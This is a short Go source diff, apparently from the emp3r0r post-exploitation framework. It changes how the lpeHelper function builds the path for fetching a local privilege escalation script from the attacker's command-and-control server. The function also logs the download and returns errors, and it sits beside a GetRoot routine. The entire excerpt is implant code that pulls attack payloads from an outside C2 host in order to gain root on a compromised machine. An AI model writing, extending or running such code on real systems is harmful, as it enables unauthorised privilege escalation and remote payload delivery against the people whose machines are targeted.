@@ -41,7 +41,7 @@ func GetRoot() error {
 func lpeHelper(method string) string {
 	log.Printf("Downloading lpe script from %s", emp3r0r_data.CCAddress+method)
 	var scriptData []byte
-	scriptData, err := DownloadViaCC(emp3r0r_data.CCAddress+"www/"+method, "")
+	scriptData, err := DownloadViaCC(method, "")
 	if err != nil {
 		return "LPE error: " + err.Error()
 	}
